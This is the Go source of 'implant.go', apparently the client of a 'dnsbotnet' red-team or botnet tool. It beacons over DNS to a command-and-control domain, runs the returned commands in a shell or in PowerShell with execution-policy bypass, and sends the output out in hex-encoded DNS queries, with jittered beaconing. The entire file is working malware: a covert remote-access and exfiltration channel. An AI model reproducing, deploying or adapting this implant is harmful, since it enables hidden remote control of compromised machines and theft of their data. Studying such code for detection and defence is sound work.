// dnsbotnet implant
package main

/*
 * implant.go
 * Connects to dnsbotnet server
 * By J. Stuart McMurray
 * Created 20180210
 * Last Modified 20180210
 */

import (
	"bytes"
	"context"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const (
	// MAXEXFIL is the maximum number of bytes we'll exfil per request
	MAXEXFIL = 31

	// RIDLEN is the length of the random ID
	RIDLEN = 4

	// DEFANGALPHABET
	DEFANGALPHABET = "abcdefghijklmnopqrstuvwxyz" +
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
		"0123456789 \n"
)

// COUNTER is used to prevent caching
var COUNTER = uint64(0)

func main() {
	log.SetOutput(os.Stderr)

	/* Seed PRNG.  Could just use CSPRNG, but this should be fine */
	rand.Seed(time.Now().UnixNano())

	var (
		bMin = flag.Duration(
			"beacon-min",
			time.Second,
			"Minimum beacon `interval`",
		)
		bMax = flag.Duration(
			"beacon-max",
			3*time.Minute,
			"Maximum beacon `interval`",
		)
		domain = flag.String(
			"domain",
			"enmala.ga",
			"DNS domain `name`",
		)
		id = flag.String(
			"id",
			defaultID(),
			"Implant `ID`",
		)
		jitter = flag.Float64(
			"jitter",
			0.25,
			"Beacon interval jitter `fraction` between 0 and 1",
		)
		cTimeout = flag.Duration(
			"command-timeout",
			time.Minute,
			"Command execution `timeout`",
		)
		counterStart = flag.Uint64(
			"counter",
			rand.Uint64(),
			"Start cache-busting counter at `N`",
		)
		defang = flag.Bool(
			"defang",
			false,
			"Don't actually run commands, send back random "+
				"characters",
		)
		exfilLen = flag.Int(
			"exfil-max",
			31,
			"Send at most `N` payload bytes per request",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

Beacons to the given domain periodically and runs commands it gets back.

The higher the jitter, the more random the beacon interval.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	COUNTER = *counterStart

	/* Make sure jitter is in the right range */
	if 0 > *jitter || 1 < *jitter {
		fmt.Fprintf(
			os.Stderr,
			"Jitter must be between 0 and 1, inclusive.\n",
		)
		os.Exit(1)
	}

	/* Make sure we don't send too many or too few bytes at once */
	if 0 >= *exfilLen {
		fmt.Fprintf(
			os.Stderr,
			"Must send at least one byte per request "+
				"(-exfil-max)\n",
		)
		os.Exit(2)
	}
	if MAXEXFIL < *exfilLen {
		fmt.Fprintf(
			os.Stderr,
			"Cannot send more than %v bytes per request "+
				"(-exfil-max)\n",
			MAXEXFIL,
		)
		os.Exit(3)
	}

	/* Print the ID we're using.  In the case of a random ID, this is not
	predictable. */
	log.Printf("ID: %v", *id)

	st := *bMin /* Sleep time */
	for {
		/* Check for tasking */
		tasking := getTasking(*id, *domain)
		/* If we have it, do it and send the output back, don't sleep
		so long next time */
		if "" != tasking {
			doTasking(
				tasking,
				*id,
				*domain,
				*cTimeout,
				*defang,
				*exfilLen,
			)
			st = *bMin
		}
		/* Sleep before next beacon */
		st = addJitter(st, *jitter)
		time.Sleep(st)
		/* Sleep longer next time */
		st *= 2
		if st > *bMax {
			st = *bMax
		}
	}
}

/* defaultID tries to use the IP address of an interface as an ID.  It returns
the first non-loopback address it finds. */
func defaultID() string {
	var id string

	/* Look through all the interfaces for one we like */
	is, err := net.Interfaces()
	if nil != err {
		log.Printf("Unable to list interfaces: %v", err)
	}
	for _, i := range is {
		/* Skip docker interfaces */
		/* TODO: Unhardcode this */
		if "docker0" == i.Name {
			continue
		}
		/* Skip loopback interfaces */
		if 0 != (net.FlagLoopback & i.Flags) {
			continue
		}
		/* Get the addresses for this interface */
		as, err := i.Addrs()
		if nil != err {
			log.Printf(
				"Unable to get addresses for %v: %v",
				i.Name,
				err,
			)
			continue
		}
		/* Use the first address we find */
		if 0 == len(as) {
			continue
		}
		id = as[0].String()
	}
	/* Clean up the address a bit, to make DNS-friendly */
	parts := strings.SplitN(id, "/", 2)
	if 0 == len(parts) { /* Probably didn't find one */
		return randomID()
	}

	/* Remove all non-hex characters */
	id = strings.Map(
		func(r rune) rune {
			/* Turn all non-hex characters into hyphens */
			if !strings.ContainsRune("abcdefABCDEF0123456789", r) {
				return '-'
			}
			return r
		},
		parts[0],
	)
	/* Trim leading and trailing -'s, which can happen with IPv6
	addresses */
	return strings.Trim(id, "-")
}

/* randomID returns an ID consisting of two random numbers */
func randomID() string {
	b := make([]byte, RIDLEN)
	if _, err := rand.Read(b); nil != err {
		panic(err)
	}
	return fmt.Sprintf("%02x", b)
}

/* getTasking beacons to the domain to try to get tasking.  It returns the
empty string if there was none. */
func getTasking(id, domain string) string {
	/* Query to send for tasking */
	d := fmt.Sprintf("0.%v.t.%v.%v", COUNTER, id, domain)
	COUNTER++

	/* Try to get a text tasking */
	txts, err := net.LookupTXT(d)
	if nil != err && !strings.HasSuffix(err.Error(), "no such host") {
		log.Printf("Error beaconing to %v: %v", d, err)
		return ""
	}

	/* We should only have one text record if it's a legit tasking */
	if 1 != len(txts) {
		return ""
	}

	return txts[0]
}

/* doTasking runs the tasking in a shell and returns the output over DNS.  If
defang is true and task is a number, that many random characters will be sent
instead of running a command.  exfilLen bytes will be sent at once. */
func doTasking(
	task string,
	id string,
	domain string,
	to time.Duration,
	defang bool,
	exfilLen int,
) {
	if defang {
		sendRandomChars(task, id, domain, exfilLen)
		return
	}

	/* Context which times out */
	ctx, cancel := context.WithTimeout(context.Background(), to)
	defer cancel() /* Shouldn't do much, but may clean things up */

	/* Make a shell */
	var cmd *exec.Cmd
	if "windows" == runtime.GOOS {
		cmd = exec.CommandContext(
			ctx,
			"powershell.exe",
			"-ep", "bypass",
			"-noni",
			"-nop",
			"-command", "-",
		)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh")
	}
	setProcAttr(cmd)

	/* Hook up stdin */
	cmd.Stdin = strings.NewReader(task)

	/* Run command */
	log.Printf("Running %q", task)
	o, err := cmd.CombinedOutput()

	/* If we got an error, stick the message on the output */
	if nil != err {
		log.Printf("Error running %q: %v", task, err)
		o = append(o, []byte(err.Error())...)
	} else {
		log.Printf("Done running %q", task)
	}

	/* Make sure we have a newline */
	if !bytes.HasSuffix(o, []byte{'\n'}) {
		o = append(o, '\n')
	}

	/* Send it back in 31-byte chunks */
	sendBytes(o, id, domain, exfilLen)
}

/* sendBytes sends off the contents of b in exfilLen-size chunks */
func sendBytes(o []byte, id, domain string, exfilLen int) {
	var (
		start int
		end   int
	)
	for start = 0; start < len(o); start += exfilLen {
		/* Work out end index */
		end = start + exfilLen
		if end > len(o) {
			end = len(o)
		}
		/* Exfil request name */
		n := fmt.Sprintf(
			"%02x.%v.o.%v.%v",
			o[start:end],
			COUNTER,
			id,
			domain,
		)
		COUNTER++
		if _, err := net.LookupIP(n); nil != err && !strings.HasSuffix(
			err.Error(),
			"no such host",
		) {
			log.Printf("Error (%v): %v", n, err)
		}
	}
}

/* sendRandomChars sends random characters to the server.  The number of
characters is controlled by putting a number in count.  exfilLen bytes will
be sent at once. */
func sendRandomChars(count, id, domain string, exfilLen int) {
	/* Try to get a number */
	n, err := strconv.Atoi(count)
	if nil != err {
		s := err.Error()
		if !strings.HasSuffix(s, "\n") {
			s += "\n"
		}
		sendBytes([]byte(s), id, domain, exfilLen)
		return
	}

	/* Characters to send */
	cs := make([]byte, n)
	for i := range cs {
		cs[i] = []byte(DEFANGALPHABET)[rand.Intn(len(DEFANGALPHABET))]
	}
	if !bytes.HasSuffix(cs, []byte{'\n'}) {
		cs = append(cs, '\n')
	}

	sendBytes(cs, id, domain, exfilLen)
}

/* addJitter returns d varied by j, which must be a fraction between 0 and
1. */
func addJitter(d time.Duration, j float64) time.Duration {
	return d + time.Duration(float64(d)*j*(2*rand.Float64()-1))
}
